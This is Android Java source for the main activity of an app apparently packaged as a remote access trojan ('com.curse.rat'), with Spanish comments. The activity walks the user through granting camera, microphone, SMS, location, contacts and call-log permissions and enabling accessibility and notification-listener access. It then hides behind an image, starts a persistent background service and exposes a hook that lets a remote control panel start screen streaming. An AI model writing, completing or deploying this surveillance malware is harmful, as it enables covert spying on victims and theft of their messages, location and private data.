package com.curse.rat;

import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.view.View;
import android.widget.Button;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {

    private static final int PERMISSION_REQUEST_CODE = 101;
    private static final int REQUEST_MEDIA_PROJECTION = 102;
    private static final String PREFS_NAME = "curse_setup";
    private static final String KEY_CONFIG_DONE = "config_done";

    private static MainActivity instance;

    public static MainActivity getInstance() {
        return instance;
    }

    private ScrollView wizardLayout;
    private Button btnRuntimePerms;
    private Button btnAccessibility;
    private Button btnNotifications;
    private Button btnBattery;
    private TextView tvRuntimeStatus;
    private TextView tvAccessibilityStatus;
    private TextView tvNotificationsStatus;
    private TextView tvBatteryStatus;

    private static final String[] RUNTIME_PERMISSIONS = {
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.READ_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_CALL_LOG
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        instance = this;

        wizardLayout = findViewById(R.id.wizardLayout);
        btnRuntimePerms = findViewById(R.id.btnRuntimePerms);
        btnAccessibility = findViewById(R.id.btnAccessibility);
        btnNotifications = findViewById(R.id.btnNotifications);
        btnBattery = findViewById(R.id.btnBattery);
        tvRuntimeStatus = findViewById(R.id.tvRuntimeStatus);
        tvAccessibilityStatus = findViewById(R.id.tvAccessibilityStatus);
        tvNotificationsStatus = findViewById(R.id.tvNotificationsStatus);
        tvBatteryStatus = findViewById(R.id.tvBatteryStatus);

        btnRuntimePerms.setOnClickListener(v -> requestRuntimePermissions());
        btnAccessibility.setOnClickListener(v ->
                startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)));
        btnNotifications.setOnClickListener(v ->
                startActivity(new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS")));
        btnBattery.setOnClickListener(v -> requestIgnoreBatteryOptimization());
    }

    @Override
    protected void onResume() {
        super.onResume();
        refreshWizardOrImage();
    }

    /** Regla central: wizard con estados si falta algo; imagen solo si config_done. */
    private void refreshWizardOrImage() {
        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        boolean configDone = prefs.getBoolean(KEY_CONFIG_DONE, false);

        if (configDone && allSetupComplete()) {
            wizardLayout.setVisibility(View.GONE);
            findViewById(R.id.ivInfoImage).setVisibility(View.VISIBLE);
            startMainService();
        } else {
            wizardLayout.setVisibility(View.VISIBLE);
            findViewById(R.id.ivInfoImage).setVisibility(View.GONE);
            refreshStates();

            // Si el usuario completa todo el wizard, marcar configuración hecha.
            // (Se comprueba en onResume, al volver de Ajustes.)
            if (allSetupComplete()) {
                prefs.edit().putBoolean(KEY_CONFIG_DONE, true).apply();
                wizardLayout.setVisibility(View.GONE);
                findViewById(R.id.ivInfoImage).setVisibility(View.VISIBLE);
                startMainService();
            }
        }
    }

    private void refreshStates() {
        int granted = 0;
        for (String p : RUNTIME_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, p)
                    == PackageManager.PERMISSION_GRANTED) granted++;
        }
        setRowState(tvRuntimeStatus,
                granted + "/" + RUNTIME_PERMISSIONS.length + " concedidos",
                granted == RUNTIME_PERMISSIONS.length);

        setRowState(tvAccessibilityStatus,
                isAccessibilityEnabled() ? "Activado" : "Desactivado",
                isAccessibilityEnabled());

        setRowState(tvNotificationsStatus,
                isNotificationListenerEnabled() ? "Activado" : "Desactivado",
                isNotificationListenerEnabled());

        setRowState(tvBatteryStatus,
                isIgnoringBattery() ? "Desactivada" : "Activa (recomendado desactivar)",
                isIgnoringBattery());
    }

    private void setRowState(TextView tv, String text, boolean ok) {
        tv.setText(text);
        tv.setTextColor(ContextCompat.getColor(this, ok
                ? android.R.color.holo_green_dark
                : android.R.color.holo_orange_dark));
    }

    private boolean allSetupComplete() {
        for (String p : RUNTIME_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, p)
                    != PackageManager.PERMISSION_GRANTED) return false;
        }
        return isAccessibilityEnabled()
                && isNotificationListenerEnabled()
                && isIgnoringBattery();
    }

    private void requestRuntimePermissions() {
        List<String> missing = new ArrayList<>();
        for (String p : RUNTIME_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, p)
                    != PackageManager.PERMISSION_GRANTED) missing.add(p);
        }
        if (!missing.isEmpty()) {
            ActivityCompat.requestPermissions(this,
                    missing.toArray(new String[0]), PERMISSION_REQUEST_CODE);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode,
                                           @NonNull String[] permissions,
                                           @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode != PERMISSION_REQUEST_CODE) return;

        boolean permanentlyDenied = false;
        for (int i = 0; i < permissions.length; i++) {
            if (grantResults[i] != PackageManager.PERMISSION_GRANTED
                    && !ActivityCompat.shouldShowRequestPermissionRationale(
                    this, permissions[i])) {
                permanentlyDenied = true;
            }
        }
        if (permanentlyDenied) {
            Toast.makeText(this,
                    "Un permiso fue denegado permanentemente. Activalo en Ajustes > Aplicaciones.",
                    Toast.LENGTH_LONG).show();
            openAppDetails();
        }
        refreshWizardOrImage();
    }

    private void openAppDetails() {
        Intent i = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
        i.setData(Uri.parse("package:" + getPackageName()));
        startActivity(i);
    }

    private void requestIgnoreBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !isIgnoringBattery()) {
            try {
                startActivity(new Intent(
                        Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                        Uri.parse("package:" + getPackageName())));
            } catch (Exception e) {
                startActivity(new Intent(
                        Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS));
            }
        }
    }

    private boolean isIgnoringBattery() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) return true;
        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        return pm != null && pm.isIgnoringBatteryOptimizations(getPackageName());
    }

    private boolean isAccessibilityEnabled() {
        String enabled = Settings.Secure.getString(getContentResolver(),
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
        return enabled != null && enabled.contains(getPackageName());
    }

    private boolean isNotificationListenerEnabled() {
        String enabled = Settings.Secure.getString(getContentResolver(),
                "enabled_notification_listeners");
        return enabled != null && enabled.contains(getPackageName());
    }

    private void startMainService() {
        Intent intent = new Intent(this, MainService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                startForegroundService(intent);
            } catch (Exception e) {
                // El sistema puede restringir un re-arranque; el Restarter del
                // servicio y el boot receiver lo relanzan
            }
        } else {
            startService(intent);
        }
    }

    // Puente requerido por ConnectionManager: no modificar (comunicacion con panel)
    public void requestScreenShare() {
        android.media.projection.MediaProjectionManager mpManager =
                (android.media.projection.MediaProjectionManager)
                        getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        if (mpManager != null) {
            startActivityForResult(
                    mpManager.createScreenCaptureIntent(),
                    REQUEST_MEDIA_PROJECTION);
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQUEST_MEDIA_PROJECTION) {
            if (resultCode == RESULT_OK && data != null) {
                ScreenManager.startStreaming(this, resultCode, data);
            }
        }
    }
}